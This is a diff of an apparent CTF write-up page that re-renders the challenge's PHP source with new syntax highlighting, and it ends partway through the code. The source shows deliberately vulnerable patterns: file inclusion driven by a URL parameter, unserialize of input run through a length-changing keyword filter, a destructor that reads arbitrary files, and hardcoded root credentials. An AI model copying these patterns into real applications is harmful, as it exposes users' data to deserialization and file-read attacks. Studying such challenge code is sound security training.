@@ -200,7 +200,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2k 字
+      1.7k 字
     </span>
   
 
@@ -210,7 +210,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      35
+      29
        分钟
     </span>
   
@@ -261,203 +261,203 @@
 <p>看来不是SQLi了      </p>
 <p>四个PHP文件    </p>
 <p><code>index.php</code>      </p>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;lib.php&quot;</span>;
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">require_once</span> <span class="token double-quoted-string string">"lib.php"</span><span class="token punctuation">;</span>
 
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]))&#123;
-	<span class="hljs-keyword">require_once</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&quot;/&quot;</span>.$_GET[<span class="hljs-string">&#x27;action&#x27;</span>].<span class="hljs-string">&quot;.php&quot;</span>);
-&#125;
-<span class="hljs-keyword">else</span>&#123;
-	<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]==<span class="hljs-number">1</span>)&#123;
-		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;
-	&#125;
-	<span class="hljs-keyword">else</span>&#123;
-		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;
-	&#125;
-&#125;
-<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;script>window.location.href='./index.php?action=update'&lt;/script>"</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;script>window.location.href='./index.php?action=login'&lt;/script>"</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre></code></pre>
 <p><code>lib.php</code>        </p>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-error_reporting(<span class="hljs-number">0</span>);
-session_start();
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params">$parm</span>)</span>
-<span class="hljs-function"></span>&#123;
-    $array = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;union&#x27;</span>, <span class="hljs-string">&#x27;regexp&#x27;</span>, <span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-string">&#x27;into&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;alter&quot;</span>);
-    <span class="hljs-keyword">return</span> str_replace($array, <span class="hljs-string">&#x27;hacker&#x27;</span>, $parm);
-&#125;
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> $id;
-    <span class="hljs-keyword">public</span> $age = <span class="hljs-literal">null</span>;
-    <span class="hljs-keyword">public</span> $nickname = <span class="hljs-literal">null</span>;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;
-            $mysqli = <span class="hljs-keyword">new</span> dbCtrl();
-            <span class="hljs-keyword">$this</span>-&gt;id = $mysqli-&gt;login(<span class="hljs-string">&#x27;select id,password from user where username=?&#x27;</span>);
-            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;id) &#123;
-                $_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;id;
-                $_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-number">1</span>;
-                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你的ID是&quot;</span> . $_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>];
-                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你好！&quot;</span> . $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>];
-                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;
-                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;id;
-            &#125;
-        &#125;
-    &#125;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        $Info = unserialize(<span class="hljs-keyword">$this</span>-&gt;getNewinfo());
-        $age = $Info-&gt;age;
-        $nickname = $Info-&gt;nickname;
-        $updateAction = <span class="hljs-keyword">new</span> UpdateHelper($_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>], $Info, <span class="hljs-string">&quot;update user SET age=<span class="hljs-subst">$age</span>,nickname=<span class="hljs-subst">$nickname</span> where id=&quot;</span> . $_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>]);
-        <span class="hljs-comment">//这个功能还没有写完 先占坑</span>
-    &#125;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        $age = $_POST[<span class="hljs-string">&#x27;age&#x27;</span>];
-        $nickname = $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>];
-        <span class="hljs-keyword">return</span> safe(serialize(<span class="hljs-keyword">new</span> Info($age, $nickname)));
-    &#125;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;nickname); <span class="hljs-comment">//危</span>
-    &#125;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">$this</span>-&gt;nickname-&gt;update(<span class="hljs-keyword">$this</span>-&gt;age);
-        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0-0&quot;</span>;
-    &#125;
-&#125;
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> $age;
-    <span class="hljs-keyword">public</span> $nickname;
-    <span class="hljs-keyword">public</span> $CtrlCase;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$age, $nickname</span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">$this</span>-&gt;age = $age;
-        <span class="hljs-keyword">$this</span>-&gt;nickname = $nickname;
-    &#125;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$name, $argument</span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="hljs-number">0</span>]);
-    &#125;
-&#125;
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UpdateHelper</span></span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> $id;
-    <span class="hljs-keyword">public</span> $newinfo;
-    <span class="hljs-keyword">public</span> $sql;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$newInfo, $sql</span>)</span>
-<span class="hljs-function">    </span>&#123;
-        $newInfo = unserialize($newInfo);
-        $upDate = <span class="hljs-keyword">new</span> dbCtrl();
-    &#125;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;sql;
-    &#125;
-&#125;
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> $hostname = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;
-    <span class="hljs-keyword">public</span> $dbuser = <span class="hljs-string">&quot;root&quot;</span>;
-    <span class="hljs-keyword">public</span> $dbpass = <span class="hljs-string">&quot;root&quot;</span>;
-    <span class="hljs-keyword">public</span> $database = <span class="hljs-string">&quot;test&quot;</span>;
-    <span class="hljs-keyword">public</span> $name;
-    <span class="hljs-keyword">public</span> $password;
-    <span class="hljs-keyword">public</span> $mysqli;
-    <span class="hljs-keyword">public</span> $token;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">$this</span>-&gt;name = $_POST[<span class="hljs-string">&#x27;username&#x27;</span>];
-        <span class="hljs-keyword">$this</span>-&gt;password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];
-        <span class="hljs-keyword">$this</span>-&gt;token = $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>];
-    &#125;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params">$sql</span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">$this</span>-&gt;mysqli = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-keyword">$this</span>-&gt;hostname, <span class="hljs-keyword">$this</span>-&gt;dbuser, <span class="hljs-keyword">$this</span>-&gt;dbpass, <span class="hljs-keyword">$this</span>-&gt;database);
-        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;
-            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败，错误:&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;connect_error);
-        &#125;
-        $result = <span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);
-        $result-&gt;bind_param(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;name);
-        $result-&gt;execute();
-        $result-&gt;bind_result($idResult, $passwordResult);
-        $result-&gt;fetch();
-        $result-&gt;close();
-        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;token == <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;
-            <span class="hljs-keyword">return</span> $idResult;
-        &#125;
-        <span class="hljs-keyword">if</span> (!$idResult) &#123;
-            <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;用户不存在!&#x27;</span>);
-            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
-        &#125;
-        <span class="hljs-keyword">if</span> (md5(<span class="hljs-keyword">$this</span>-&gt;password) !== $passwordResult) &#123;
-            <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;密码错误！&#x27;</span>);
-            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
-        &#125;
-        $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;name;
-        <span class="hljs-keyword">return</span> $idResult;
-    &#125;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">$sql</span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-comment">//还没来得及写</span>
-    &#125;
-&#125;</code></pre></code></pre>
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">function</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$parm</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'union'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'regexp'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'load'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'into'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'file'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'insert'</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"'"</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\\'</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"*"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"alter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name">User</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'select id,password from user where username=?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">;</span>
+                <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"你的ID是"</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"你好！"</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;script>window.location.href='./update.php'&lt;/script>"</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$Info</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getNewinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token variable">$Info</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">;</span>
+        <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$Info</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token punctuation">;</span>
+        <span class="token variable">$updateAction</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$Info</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"update user SET age=<span class="token interpolation"><span class="token variable">$age</span></span>,nickname=<span class="token interpolation"><span class="token variable">$nickname</span></span> where id="</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//这个功能还没有写完 先占坑</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getNewInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//危</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token double-quoted-string string">"0-0"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name">Info</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$nickname</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span> <span class="token operator">=</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$argument</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">CtrlCase</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$argument</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name">UpdateHelper</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$newinfo</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$newInfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$upDate</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sql</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name">dbCtrl</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$hostname</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$database</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hostname</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dbuser</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dbpass</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"连接失败，错误:"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
